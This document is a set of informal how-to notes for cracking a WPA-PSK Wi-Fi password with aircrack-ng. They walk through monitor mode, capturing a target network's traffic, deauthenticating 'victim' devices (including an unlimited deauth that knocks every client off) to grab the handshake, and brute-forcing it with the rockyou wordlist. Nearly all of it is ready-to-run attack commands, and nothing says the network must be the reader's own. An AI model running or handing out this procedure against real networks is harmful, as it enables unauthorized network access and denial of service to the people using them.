-NB:: NETWORK MUST BE USING WPA PSK ENCRYPTION.
-Word list attack is just a bunch of words that will be encrypted and compared to the encryption of the wifi password.
-For this to work you wifi card must support monitor mode else you have to get an adapter.
			

					STEPS (MUST BE RUN IN ROOT)
					===============================
-Get the name of you wireless network interface.
	EG.
		ip a
			OR
		sudo ifconfig
			OR
		airmon-ng
				== in my case its wlp2s0


-Lets check if the airmon-ng is installed.
	EG.
		airmon-ng
			OR
		sudo airmon-ng

    -If there is a problem then just install:
		EG.
			sudo apt install aircrack-ng


-Turn on monitor mode on the wifi or device so that you can see the networks that are around you.
	use => airmon-ng start <wifi interface>
	EG.
		airmon-ng start wlp2s0.

	-When command is executed the network interface name adds mon:
		EG.
			wlp2s0 -> wlp2s0mon

	-the internet will break as soon as the monitor mode is turned on.


-Now you can check if the card has been changed to the monitor state by typing :
	EG.
		iwconfig.
	
	-if nothing about monitoring is written in the mode, then the wifi card doesn't support monitor mode.


-Now you can start listenning to all the networks that are around you using:
	-airodump-ng followed by the wireless network interface 
		EG.
			airodump-ng wlp2s0mon -> we are using wlp2s0mon since the card's name has changed from wlp2s0.

		-here we are concerned about the channel (ch) of the network and the BSSID. 


-Now with the channel number and the BSSID we are going to:
	-Use airodump-ng followed by the BSSID value, file that is going to be exported and channel number and network interface.
		EG.
			airodump-ng -d 04:95:E6:F6:3B:80 -w file_toStore -c 5 wlp2s0mon

				-d :- it allows us to specify the router/network basic service set Indentifyer (bssid).
				-w :- will write the data gotten from the program to a specific file.
				-c :- specifyies the starting channel but the program will hope from one channel to the other to get a better aspect.
		
		-this will show you all the devices that are currently connected to that network.


-Now we need a device to connect to the network so that in the handshake we can get the incrypted password
.To do this we use DEAUTHENTICATION(-0) ATTACK to force it to reconnect so that we can campture the handshake. DON'T CLOSE THE WINDOW WITH THE SIXTH PROCESS RUNNING.
		-we use the aireplay-ng followed by the -0, followed by the number of deauthentication packets (10 in my case.), -a followed by the BSSID or router -c followed by the victims BSSID then network interface.
		 EG.
		 	aireplay-ng -0 10 -a 04:95:E6:F6:3B:80 -c F2:84:64:39:84:24 wlp2s0mon -> will remove the specified device mac address and send 10 deauthentication 
		 																			 packets.
		 		OR
		 	aireplay-ng --deauth 0 -a 04:95:E6:F6:3B:80 wlp2s0mon -> will remove all the devices on the network and send unlimited deauthentication packets.
		 														  -> this can be used to remove all devices on your network.

		 		-0 :- allows us to specify the number of deauthentication packets that are going to be sent which in our case is 10.
		 		-a :- the address of the router/network.
		 		--deauth :- this allows us to send unlimited number of deauthentication packets.
		 		-c :- specifyes the device that will be removed or affected by the deauthenticaton packets.
		 	
		-For more efficienty you should use the --deauth 0 instead of specifying the number of packets to be sent.
		-When the handshake has been gotten when we go back to the sixth step, we will see on the first line :
			-wps handshake followed by the device mac address of the device that allowed us to get the handshake.
				EG.
					WPA handshake: 04:95:E6:F6:3B:80

		- also we can view the filename.cap where filename refers to the file name you gave the 6th step using wireshark and look for the eapol.
			EG.
				- if you used filename of opens
					wireshark ./opens.cap -> filter the data in wireshark using eapol to see the handshake that occured.


-Now you can use the wordlist that is installed to cross check their incryption with the incryption of the handshake:

		-All wordlists are found in this location:
			/usr/share/wordlist/
		-but if unsure then search wordlist in the search bar.

		-we use aircrack-ng followed by the path to the wordlist then the name of the capture file (file.cap)
			EG.
				aircrack-ng -w /usr/share/wordlist/rockyou.txt filename.cap


-When done you can just close both the airmon/monitor mode and restart or the net* services:
	EG.
		airmon-ng stop wlp2s0mon
			AND 
		sudo ifconfig wlp2s0 up -> the wlp2s0 is the network interface that we placed into monitor mode.
								-> when the network interface is down then you can't access the web.
								-> can be undone by restarting the pc or using this command.
			AND
		sudo systemctl restart NetworkManager
			OR
		sudo service NetworkManager restart
